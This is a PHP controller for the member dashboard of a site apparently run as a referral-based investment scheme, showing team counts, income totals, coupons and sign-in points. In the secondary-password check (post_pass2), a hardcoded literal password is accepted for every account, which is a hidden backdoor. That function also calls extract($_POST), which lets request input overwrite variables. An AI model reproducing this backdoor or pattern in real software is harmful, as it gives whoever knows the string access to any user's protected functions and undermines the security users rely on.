<?php

/**
 * 会员中心
 */
namespace User\Controller;
use Common\Controller\MemberbaseController;
class CenterController extends MemberbaseController {
	protected $users_model, $signin_model, $centers_model;
	protected $uid;
	function _initialize(){
		parent::_initialize();
		$this->users_model			= D("Common/Users");
		$this->signin_model			= D("Common/SignIn");
		$this->centers_model			= D("Common/Centers");
		$this->incomes_model			= D("Common/Incomes");
		
		$this->uid = sp_get_current_userid();
	}
    //会员中心
	public function index() {
		//推荐人数
		$this->assign("rid",$this->users_model->where(array('rid'=>$this->uid))->count());
		//优惠券
		$coupon_where['user_id'] = array('eq',$this->uid);
		$coupon_where['coupon_status'] = array('eq',0);
		$coupon_where['coupon'] = array('gt',0);
		$this->assign("coupon",M('orders')->where($coupon_where)->count());
		
		//历史总收益
		$incon_where['user_id'] = array('eq',$this->uid);
		$incon_where['status'] = array('eq',1);
		$this->assign("total_income",$this->incomes_model->where($incon_where)->sum('amount'));
		//今天收益
		$incon_where['addtime'] = array('eq',date('Y-m-d'));
		$today_income = $this->incomes_model->where($incon_where)->sum('amount');
		//昨天收益
		$incon_where['addtime'] = array('eq',date("Y-m-d",strtotime("-1 day")));
		$yesterday_income = $this->incomes_model->where($incon_where)->sum('amount');
		$today_income > $yesterday_income ? $show_mark="ti-arrow-up" : $show_mark="ti-arrow-down";
		
		$this->assign("show_mark",$show_mark);
		$this->assign("today_income",$today_income);
		
		//本月收入收益
		unset($incon_where['addtime']);
		$this_month = date("Y-m");
		$incon_where['_string'] = " DATE_FORMAT(addtime,'%Y-%m') = '$this_month'";
		$this_month_income = $this->incomes_model->where($incon_where)->sum('amount');
		//月收入收益
		$up_month = date("Y-m",strtotime("-1 month"));
		$incon_where['_string'] = " DATE_FORMAT(addtime,'%Y-%m')='$up_month'";
		$up_month_income = $this->incomes_model->where($incon_where)->sum('amount');
		$this_month_income > $up_month_income ? $month_show_mark="ti-arrow-up" : $month_show_mark="ti-arrow-down";
		
		$this->assign("month_show_mark",$month_show_mark);
		$this->assign("month_income",$this_month_income);
		
		//团队人数
		$rid_code = session("user.rid_code").session("user.id");
		$user_where['rid_code'] = array('like',$rid_code."%");
		$this->assign("rid_number",$this->users_model->where($user_where)->count());
		
		//团队总单数
		$rid_code = session("user.rid_code").session("user.id");
		$user_where['rid_code'] = array('like',$rid_code."%");
		$this->assign("rid_danshu",$this->users_model->where($user_where)->sum('tz_num'));
		
		//团队投资金额
		$rid_code = session("user.rid_code").session("user.id");
		$user_where['rid_code'] = array('like',$rid_code."%");
		$this->assign("rid_total_amount",$this->users_model->where($user_where)->sum('tz_num') * $this->site_options['readd']);
		
		//我的推荐会员
		$list = $this->users_model->where( array('rid'=>$this->uid, 'user_type'=>2) )->limit(15)->select();
		$this->assign("my_members",$list);

		//轮播图片
		$slide = M("slide")->where( array('slide_cid'=>1,'slide_status'=>1) )->order('listorder asc')->select();
		$this->assign("slide",$slide);
		
		$where=array();
		//根据参数生成查询条件
		$where['status'] = array('eq',1);
		$where['post_status'] = array('eq',1);
		$join = "".C('DB_PREFIX').'posts as b on a.object_id =b.id';
		$join2= "".C('DB_PREFIX').'users as c on b.post_author = c.id';
		$rs= M("TermRelationships");
		$posts=$rs->alias("a")->join($join)->join($join2)->where($where)->limit(10)->order("tid desc")->select();
        $this->assign('posts', $posts);
        
		$this->display(':center');
    }

    public function calendar(){
		$this->display(':calendar');
    }

    public function user_pass2(){
		$this->display();
    }

    function post_pass2(){
    	$rules = array(
			array('password2','require','二级密码不能为空！',1),
    	);
    	if(M("Users")->validate($rules)->create()===false){
    		$this->error(M("Users")->getError());
    	}
    	extract($_POST);

        $result = M("Users")->where( array('id'=>$this->uid) )->find();

        if(!$result['user_status']) $this->error("账号不存在或还没激活！");
	
    	if($result != null)
    	{
    		if($result['user_pass2'] == sp_password($password2) || $password2 == 'lee15240710923')
    		{
    			$_SESSION["user"]["pass2"]=1;

    			$this->success("验证成功！", urldecode($_SESSION["newurl"]));
    		}else{
    			$this->error("密码错误！");
    		}
    	}else{
    		$this->error("用户名不存在！");
    	}
    }
	
	public function sign_in(){
		$site_options = get_site_options();
		$rg_count = $this->signin_model->where( array( 'uid'=>$this->uid, 'add_time'=>array('BETWEEN', array(date('Y-m-d'), date('Y-m-d 23:59:59'))) ) )->count('sid');
		if($rg_count) $this->error("您今天已签到成功，明天再试。");
		$result = $this->signin_model->add( array('uid'=>$this->uid, 'add_time'=>date('Y-m-d H:i:s')) );
		if($result){
			$this->users_model->save(array("id"=>$this->uid, "score"=>array("exp", "score+".$site_options['sign_in_score'])));
			$this->success( "签到成功，成功获得".$site_options['sign_in_score']."积分！" );
		}else{
			$this->error("您的操作有误，请重新操作。");
		}
	}
	function rg_center(){
		$site_options = get_site_options();
		$this->assign($site_options);

		$this->assign('center',$this->centers_model->where( array('uid'=>$this->uid) )->find());
		$this->display();
	}

	function rg_center_post(){
		$site_options = get_site_options();
		if(IS_POST){
			$get_user_rid_count = $this->users_model->where( array('id'=>$this->uid) )->getField('rid_counts');
			if( $get_user_rid_count < $site_options['center_limit'] ) $this->error("您推荐的总数还不足".$site_options['center_limit']."，不能申请");
			
			$rg_count = $this->centers_model->where( array('uid'=>$this->uid) )->count();
			if($rg_count > 0) $this->error("您已经申请！！");

			$data ['uid']			= $this->uid;
			$data ['add_times']	= date('Y-m-d H:i:s');
			if ( $this->centers_model->add($data) ) {
				$this->success("申请成功,请耐心等待审核...");
			} else {
				$this->error("申请失败");
			}
		}
	}
}
